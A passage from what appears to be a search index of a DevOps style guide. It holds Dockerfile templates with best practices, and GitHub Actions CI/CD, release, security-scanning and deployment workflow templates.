--interval=30s --timeout=3s --start-period=10s --retries=3 \\\n    CMD python -c \"import urllib.request; urllib.request.urlopen('http://localhost:8000/health/')\"\n\n## Run application with gunicorn\nCMD [\"gunicorn\", \"--bind\", \"0.0.0.0:8000\", \"--workers\", \"4\", \"config.wsgi:application\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#nginx-static-site","title":"Nginx Static Site","text":"<pre><code>## Multi-stage build for static site\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\n## Copy package files\nCOPY package*.json ./\n\n## Install dependencies\nRUN npm ci\n\n## Copy source\nCOPY . .\n\n## Build static site\nRUN npm run build\n\n## Production stage with nginx\nFROM nginx:1.25-alpine AS production\n\n## Copy custom nginx config\nCOPY nginx.conf /etc/nginx/nginx.conf\n\n## Copy built static files\nCOPY --from=builder /app/dist /usr/share/nginx/html\n\n## Create non-root user\nRUN addgroup -g 101 -S nginx &amp;&amp; \\\n    adduser -S -D -H -u 101 -h /var/cache/nginx -s /sbin/nologin -G nginx -g nginx nginx\n\n## Set ownership\nRUN chown -R nginx:nginx /usr/share/nginx/html &amp;&amp; \\\n    chown -R nginx:nginx /var/cache/nginx &amp;&amp; \\\n    chown -R nginx:nginx /var/log/nginx &amp;&amp; \\\n    chown -R nginx:nginx /etc/nginx/conf.d\n\n## Make nginx run as non-root\nRUN touch /var/run/nginx.pid &amp;&amp; \\\n    chown -R nginx:nginx /var/run/nginx.pid\n\n## Switch to non-root user\nUSER nginx\n\n## Expose port\nEXPOSE 8080\n\n## Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD wget --no-verbose --tries=1 --spider http://localhost:8080/ || exit 1\n\n## Run nginx\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#development-vs-production","title":"Development vs Production","text":"","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#development-dockerfile","title":"Development Dockerfile","text":"<pre><code>## Development Dockerfile with hot reload\nFROM node:20-alpine\n\nWORKDIR /app\n\n## Install dependencies\nCOPY package*.json ./\nRUN npm install\n\n## Copy source (will be overridden by volume mount)\nCOPY . .\n\n## Expose port for development server\nEXPOSE 3000\n\n## Enable hot reload\nCMD [\"npm\", \"run\", \"dev\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#production-dockerfile","title":"Production Dockerfile","text":"<pre><code>## Production Dockerfile (optimized)\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\nRUN npm run build &amp;&amp; npm prune --production\n\nFROM node:20-alpine AS production\n\nRUN apk add --no-cache dumb-init &amp;&amp; \\\n    addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\nWORKDIR /app\n\nCOPY --from=builder --chown=nodejs:nodejs /app/dist ./dist\nCOPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules\n\nUSER nodejs\n\nEXPOSE 3000\n\nENTRYPOINT [\"dumb-init\", \"--\"]\nCMD [\"node\", \"dist/index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#best-practices","title":"Best Practices","text":"","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#security","title":"Security","text":"<pre><code>## 1. Use specific version tags\nFROM node:20.10.0-alpine  # Not :latest\n\n## 2. Run as non-root user\nRUN addgroup -g 1001 appgroup &amp;&amp; adduser -S appuser -u 1001 -G appgroup\nUSER appuser\n\n## 3. Scan for vulnerabilities\n## Use tools like Trivy, Snyk, or Clair\n\n## 4. Use minimal base images\nFROM alpine:3.19  # Or scratch for Go apps\n\n## 5. Don't include secrets\n## Use build args or secret mounts instead\nRUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm install\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#optimization","title":"Optimization","text":"<pre><code>## 1. Leverage layer caching - copy dependencies first\nCOPY package*.json ./\nRUN npm ci\nCOPY . .  # This changes more frequently\n\n## 2. Use .dockerignore\n## Create .dockerignore with:\n## node_modules\n## .git\n## *.md\n\n## 3. Multi-stage builds to reduce image size\nFROM builder AS production  # Only copy what's needed\n\n## 4. Combine RUN commands to reduce layers\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y pkg1 pkg2 &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n## 5. Use --no-cache-dir for pip\nRUN pip install --no-cache-dir -r requirements.txt\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#health-checks","title":"Health Checks","text":"<pre><code>## HTTP health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD curl -f http://localhost:8000/health || exit 1\n\n## Python health check (no curl)\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD python -c \"import urllib.request; urllib.request.urlopen('http://localhost:8000/health')\" || exit 1\n\n## Node.js health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD node -e \"require('http').get('http://localhost:3000/health', (r) =&gt; {process.exit(r.statusCode === 200 ? 0 : 1)})\"\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#common-patterns","title":"Common Patterns","text":"","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#using-build-arguments","title":"Using Build Arguments","text":"<pre><code>ARG PYTHON_VERSION=3.12\nFROM python:${PYTHON_VERSION}-slim\n\nARG BUILD_DATE\nARG VERSION\nARG REVISION\n\nLABEL org.opencontainers.image.created=\"${BUILD_DATE}\" \\\n      org.opencontainers.image.version=\"${VERSION}\" \\\n      org.opencontainers.image.revision=\"${REVISION}\"\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#using-secrets-during-build","title":"Using Secrets During Build","text":"<pre><code>## Mount secrets without storing in layers\nRUN --mount=type=secret,id=pip_config \\\n    pip config set global.index-url $(cat /run/secrets/pip_config) &amp;&amp; \\\n    pip install -r requirements.txt\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#conditional-stages","title":"Conditional Stages","text":"<pre><code>## Base stage\nFROM node:20-alpine AS base\nWORKDIR /app\nCOPY package*.json ./\n\n## Development stage\nFROM base AS development\nRUN npm install\nCOPY . .\nCMD [\"npm\", \"run\", \"dev\"]\n\n## Production stage\nFROM base AS production\nRUN npm ci --only=production\nCOPY . .\nRUN npm run build\nCMD [\"node\", \"dist/index.js\"]\n\n## Build with: docker build --target production -t myapp:prod .\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#dockerignore-template","title":".dockerignore Template","text":"<pre><code>## Version control\n.git\n.gitignore\n.gitattributes\n\n## CI/CD\n.github\n.gitlab-ci.yml\n.travis.yml\n\n## Dependencies\nnode_modules\nvenv\n.venv\n\n## Build artifacts\ndist\nbuild\ntarget\n*.pyc\n__pycache__\n\n## IDE\n.vscode\n.idea\n*.swp\n*.swo\n\n## OS\n.DS_Store\nThumbs.db\n\n## Logs\n*.log\nlogs\n\n## Documentation\n*.md\ndocs\n\n## Tests\ntests\n__tests__\n*.test.js\n*.spec.js\n\n## Environment files\n.env\n.env.local\n.env.*.local\n\n## Docker\nDockerfile*\ndocker-compose*.yml\n.dockerignore\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#advanced-patterns","title":"Advanced Patterns","text":"","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#multi-architecture-build","title":"Multi-Architecture Build","text":"<pre><code>## Build for multiple architectures\nFROM --platform=$BUILDPLATFORM golang:1.21-alpine AS builder\n\nARG TARGETPLATFORM\nARG BUILDPLATFORM\nARG TARGETOS\nARG TARGETARCH\n\nWORKDIR /app\n\nCOPY go.mod go.sum ./\nRUN go mod download\n\nCOPY . .\n\nRUN CGO_ENABLED=0 GOOS=${TARGETOS} GOARCH=${TARGETARCH} \\\n    go build -o /app/server ./cmd/server\n\nFROM alpine:3.19\n\nCOPY --from=builder /app/server /server\n\nENTRYPOINT [\"/server\"]\n\n## Build with: docker buildx build --platform linux/amd64,linux/arm64 -t myapp .\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#using-cache-mounts","title":"Using Cache Mounts","text":"<pre><code>FROM golang:1.21-alpine AS builder\n\nWORKDIR /app\n\nCOPY go.mod go.sum ./\n\n## Use cache mount for go modules\nRUN --mount=type=cache,target=/go/pkg/mod \\\n    go mod download\n\nCOPY . .\n\n## Use cache mount for build cache\nRUN --mount=type=cache,target=/go/pkg/mod \\\n    --mount=type=cache,target=/root/.cache/go-build \\\n    CGO_ENABLED=0 go build -o /app/server ./cmd/server\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#references","title":"References","text":"","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Dockerfile Reference</li> <li>Multi-stage Builds</li> <li>Best Practices</li> </ul>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#security_1","title":"Security","text":"<ul> <li>Docker Security Best Practices</li> <li>Snyk Docker Security</li> <li>CIS Docker Benchmark</li> </ul>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#tools","title":"Tools","text":"<ul> <li>Hadolint - Dockerfile linter</li> <li>Dive - Image layer analysis</li> <li>Trivy - Vulnerability scanner</li> <li>Docker Slim - Image optimizer</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/github_actions_workflow_templates/","title":"GitHub Actions Workflow Templates","text":"","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#overview","title":"Overview","text":"<p>This document provides comprehensive GitHub Actions workflow templates for CI/CD, testing, building, and deployment across all languages and frameworks covered in this style guide.</p>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#python-cicd-workflow","title":"Python CI/CD Workflow","text":"<pre><code>name: Python CI/CD\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: [\"3.10\", \"3.11\", \"3.12\"]\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n          cache: 'pip'\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install -e \".[dev]\"\n\n      - name: Lint with ruff\n        run: ruff check src tests\n\n      - name: Check formatting with black\n        run: black --check src tests\n\n      - name: Type check with mypy\n        run: mypy src\n\n      - name: Run tests with pytest\n        run: |\n          pytest --cov --cov-report=xml --cov-report=term\n\n      - name: Upload coverage to Codecov\n        uses: codecov/codecov-action@v3\n        with:\n          file: ./coverage.xml\n          flags: unittests\n          name: codecov-umbrella\n\n  security:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Bandit security scan\n        run: |\n          pip install bandit\n          bandit -r src -f json -o bandit-report.json\n\n      - name: Run Safety dependency check\n        run: |\n          pip install safety\n          safety check --json\n\n  build:\n    needs: [test, security]\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.10\"\n\n      - name: Build package\n        run: |\n          pip install build\n          python -m build\n\n      - name: Upload artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#nodejs-typescript-cicd-workflow","title":"Node.js / TypeScript CI/CD Workflow","text":"<pre><code>name: Node.js CI/CD\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        node-version: [18, 20, 22]\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Lint\n        run: npm run lint\n\n      - name: Type check\n        run: npm run type-check\n\n      - name: Run tests\n        run: npm test -- --coverage\n\n      - name: Upload coverage\n        uses: codecov/codecov-action@v3\n        with:\n          files: ./coverage/coverage-final.json\n\n  build:\n    needs: test\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Upload build artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: build\n          path: dist/\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#terraform-cicd-workflow","title":"Terraform CI/CD Workflow","text":"<pre><code>name: Terraform CI/CD\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\nenv:\n  TF_VERSION: 1.6.0\n\njobs:\n  validate:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n        with:\n          terraform_version: ${{ env.TF_VERSION }}\n\n      - name: Terraform Format Check\n        run: terraform fmt -check -recursive\n\n      - name: Terraform Init\n        run: terraform init -backend=false\n\n      - name: Terraform Validate\n        run: terraform validate\n\n      - name: Run tflint\n        uses: terraform-linters/setup-tflint@v4\n        with:\n          tflint_version: latest\n\n      - name: TFLint\n        run: tflint --recursive\n\n  security:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run tfsec\n        uses: aquasecurity/tfsec-action@v1.0.0\n        with:\n          soft_fail: true\n\n      - name: Run Checkov\n        uses: bridgecrewio/checkov-action@v12\n        with:\n          directory: .\n          framework: terraform\n          soft_fail: true\n\n  plan:\n    needs: [validate, security]\n    runs-on: ubuntu-latest\n    if: github.event_name == 'pull_request'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n        with:\n          terraform_version: ${{ env.TF_VERSION }}\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: us-east-1\n\n      - name: Terraform Init\n        run: terraform init\n\n      - name: Terraform Plan\n        run: terraform plan -out=tfplan\n\n      - name: Upload plan\n        uses: actions/upload-artifact@v4\n        with:\n          name: tfplan\n          path: tfplan\n\n  apply:\n    needs: [validate, security]\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n        with:\n          terraform_version: ${{ env.TF_VERSION }}\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: us-east-1\n\n      - name: Terraform Init\n        run: terraform init\n\n      - name: Terraform Apply\n        run: terraform apply -auto-approve\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#docker-build-and-push-workflow","title":"Docker Build and Push Workflow","text":"<pre><code>name: Docker Build and Push\n\non:\n  push:\n    branches: [main]\n    tags:\n      - 'v*'\n  pull_request:\n    branches: [main]\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Log in to Container Registry\n        if: github.event_name != 'pull_request'\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Extract metadata\n        id: meta\n        uses: docker/metadata-action@v5\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n          tags: |\n            type=ref,event=branch\n            type=ref,event=pr\n            type=semver,pattern={{version}}\n            type=semver,pattern={{major}}.{{minor}}\n            type=sha\n\n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: ${{ github.event_name != 'pull_request' }}\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n\n  security-scan:\n    needs: build\n    runs-on: ubuntu-latest\n    if: github.event_name != 'pull_request'\n\n    steps:\n      - name: Run Trivy vulnerability scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n\n      - name: Upload Trivy results to GitHub Security\n        uses: github/codeql-action/upload-sarif@v3\n        with:\n          sarif_file: 'trivy-results.sarif'\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#release-workflow","title":"Release Workflow","text":"<pre><code>name: Release\n\non:\n  push:\n    tags:\n      - 'v*'\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.10\"\n\n      - name: Install dependencies\n        run: |\n          pip install build twine\n\n      - name: Build package\n        run: python -m build\n\n      - name: Check distribution\n        run: twine check dist/*\n\n      - name: Upload artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n  publish-pypi:\n    needs: build\n    runs-on: ubuntu-latest\n    environment: release\n\n    steps:\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Publish to PyPI\n        uses: pypa/gh-action-pypi-publish@release/v1\n        with:\n          password: ${{ secrets.PYPI_API_TOKEN }}\n\n  create-release:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Generate changelog\n        id: changelog\n        run: |\n          echo \"## What's Changed\" &gt; CHANGELOG.md\n          git log --pretty=format:\"- %s (%h)\" $(git describe --tags --abbrev=0 HEAD^)..HEAD &gt;&gt; CHANGELOG.md\n\n      - name: Create GitHub Release\n        uses: softprops/action-gh-release@v1\n        with:\n          body_path: CHANGELOG.md\n          files: dist/*\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#reusable-workflow-test","title":"Reusable Workflow - Test","text":"<pre><code>## .github/workflows/reusable-test.yml\nname: Reusable Test Workflow\n\non:\n  workflow_call:\n    inputs:\n      python-version:\n        required: true\n        type: string\n      working-directory:\n        required: false\n        type: string\n        default: '.'\n    outputs:\n      coverage:\n        description: \"Test coverage percentage\"\n        value: ${{ jobs.test.outputs.coverage }}\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    outputs:\n      coverage: ${{ steps.coverage.outputs.percentage }}\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ inputs.python-version }}\n          cache: 'pip'\n\n      - name: Install dependencies\n        working-directory: ${{ inputs.working-directory }}\n        run: |\n          pip install -e \".[dev]\"\n\n      - name: Run tests\n        working-directory: ${{ inputs.working-directory }}\n        run: |\n          pytest --cov --cov-report=term --cov-report=json\n\n      - name: Extract coverage\n        id: coverage\n        working-directory: ${{ inputs.working-directory }}\n        run: |\n          COVERAGE=$(jq '.totals.percent_covered' coverage.json)\n          echo \"percentage=$COVERAGE\" &gt;&gt; $GITHUB_OUTPUT\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#using-reusable-workflow","title":"Using Reusable Workflow","text":"<pre><code>## .github/workflows/ci.yml\nname: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  test-python-310:\n    uses: ./.github/workflows/reusable-test.yml\n    with:\n      python-version: \"3.10\"\n\n  test-python-311:\n    uses: ./.github/workflows/reusable-test.yml\n    with:\n      python-version: \"3.11\"\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#multi-language-monorepo-workflow","title":"Multi-Language Monorepo Workflow","text":"<pre><code>name: Monorepo CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  detect-changes:\n    runs-on: ubuntu-latest\n    outputs:\n      frontend: ${{ steps.filter.outputs.frontend }}\n      backend: ${{ steps.filter.outputs.backend }}\n      terraform: ${{ steps.filter.outputs.terraform }}\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: dorny/paths-filter@v2\n        id: filter\n        with:\n          filters: |\n            frontend:\n              - 'frontend/**'\n            backend:\n              - 'backend/**'\n            terraform:\n              - 'terraform/**'\n\n  test-frontend:\n    needs: detect-changes\n    if: needs.detect-changes.outputs.frontend == 'true'\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: 'npm'\n          cache-dependency-path: frontend/package-lock.json\n\n      - name: Install dependencies\n        working-directory: frontend\n        run: npm ci\n\n      - name: Run tests\n        working-directory: frontend\n        run: npm test\n\n  test-backend:\n    needs: detect-changes\n    if: needs.detect-changes.outputs.backend == 'true'\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.10\"\n          cache: 'pip'\n          cache-dependency-path: backend/requirements.txt\n\n      - name: Install dependencies\n        working-directory: backend\n        run: |\n          pip install -r requirements.txt\n          pip install -r requirements-dev.txt\n\n      - name: Run tests\n        working-directory: backend\n        run: pytest\n\n  validate-terraform:\n    needs: detect-changes\n    if: needs.detect-changes.outputs.terraform == 'true'\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Terraform Format Check\n        working-directory: terraform\n        run: terraform fmt -check\n\n      - name: Terraform Validate\n        working-directory: terraform\n        run: |\n          terraform init -backend=false\n          terraform validate\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#security-scanning-workflow","title":"Security Scanning Workflow","text":"<pre><code>name: Security Scanning\n\non:\n  push:\n    branches: [main]\n  pull_request:\n  schedule:\n    - cron: '0 0 * * 0'  # Weekly on Sunday\n\njobs:\n  codeql:\n    runs-on: ubuntu-latest\n    permissions:\n      security-events: write\n      actions: read\n      contents: read\n\n    strategy:\n      matrix:\n        language: [python, javascript]\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Initialize CodeQL\n        uses: github/codeql-action/init@v3\n        with:\n          languages: ${{ matrix.language }}\n\n      - name: Autobuild\n        uses: github/codeql-action/autobuild@v3\n\n      - name: Perform CodeQL Analysis\n        uses: github/codeql-action/analyze@v3\n\n  dependency-review:\n    runs-on: ubuntu-latest\n    if: github.event_name == 'pull_request'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Dependency Review\n        uses: actions/dependency-review-action@v3\n\n  secret-scanning:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: TruffleHog Secret Scan\n        uses: trufflesecurity/trufflehog@main\n        with:\n          path: ./\n          base: ${{ github.event.repository.default_branch }}\n          head: HEAD\n\n  sast:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Semgrep\n        uses: returntocorp/semgrep-action@v1\n        with:\n          config: auto\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#deployment-workflow","title":"Deployment Workflow","text":"<pre><code>name: Deploy to Production\n\non:\n  push:\n    branches: [main]\n  workflow_dispatch:\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment:\n      name: production\n      url: https://example.com\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS Credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n          aws-region: us-east-1\n\n      - name: Deploy to ECS\n        run: |\n          aws ecs update-service \\\n            --cluster production-cluster \\\n            --service web-service \\\n            --force-new-deployment\n\n      - name: Wait for deployment\n        run: |\n          aws ecs wait services-stable \\\n            --cluster production-cluster \\\n            --services web-service\n\n      - name: Notify Slack\n        if: always()\n        uses: slackapi/slack-github-action@v1.25.0\n        with:\n          webhook-url: ${{ secrets.SLACK_WEBHOOK }}\n          payload: |\n            {\n              \"text\": \"Deployment to production: ${{ job.status }}\",\n              \"blocks\": [\n                {\n                  \"type\": \"section\",\n                  \"text\": {\n                    \"type\": \"mrkdwn\",\n                    \"text\": \"Deployment Status: *${{ job.status }}*\\nCommit: ${{ github.sha }}\\nAuthor: ${{ github.actor }}\"\n                  }\n                }\n              ]\n            }\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#best-practices","title":"Best Practices","text":"","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#workflow-optimization","title":"Workflow Optimization","text":"<pre><code>## Cache dependencies\n- uses: actions/cache@v3\n  with:\n    path: ~/.cache/pip\n    key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements.txt') }}\n    restore-keys: |\n      ${{ runner.os }}-pip-\n\n## Use matrix strategy for multiple versions\nstrategy:\n  matrix:\n    python-version: [\"3.10\", \"3.11\", \"3.12\"]\n  fail-fast: false  # Continue other jobs if one fails\n\n## Conditional job execution\nif: github.event_name == 'push' &amp;&amp; github.ref == 'refs/heads/main'\n\n## Job dependencies\nneeds: [test, lint, security]\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#security-best-practices","title":"Security Best Practices","text":"<pre><code>## Use environment protection rules\nenvironment:\n  name: production\n  url: https://example.com\n\n## Minimal permissions\npermissions:\n  contents: read\n  packages: write\n\n## Use secrets for sensitive data\nenv:\n  API_KEY: ${{ secrets.API_KEY }}\n\n## Pin action versions\nuses: actions/checkout@v4  # Not @main\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#artifact-management","title":"Artifact Management","text":"<pre><code>## Upload artifacts\n- uses: actions/upload-artifact@v4\n  with:\n    name: test-results\n    path: |\n      test-results/\n      coverage/\n    retention-days: 30\n\n## Download artifacts\n- uses: actions/download-artifact@v4\n  with:\n    name: test-results\n    path: test-results/\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#composite-actions","title":"Composite Actions","text":"","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#custom-action-example","title":"Custom Action Example","text":"<pre><code>## .github/actions/setup-python-env/action.yml\nname: 'Setup Python Environment'\ndescription: 'Set up Python with caching and install dependencies'\n\ninputs:\n  python-version:\n    description: 'Python version to use'\n    required: true\n  cache-key:\n    description: 'Cache key prefix'\n    required: false\n    default: 'pip'\n\nruns:\n  using: 'composite'\n  steps:\n    - name: Set up Python\n      uses: actions/setup-python@v5\n      with:\n        python-version: ${{ inputs.python-version }}\n        cache: ${{ inputs.cache-key }}\n\n    - name: Install dependencies\n      shell: bash\n      run: |\n        python -m pip install --upgrade pip\n        pip install -e \".[dev]\"\n</code></pre>","tags":["github-actions","ci-cd","workflows","automation","devops"]},{"location":"04_templates/github_actions_workflow_templates/#using-composite-action","title":"Using Composite 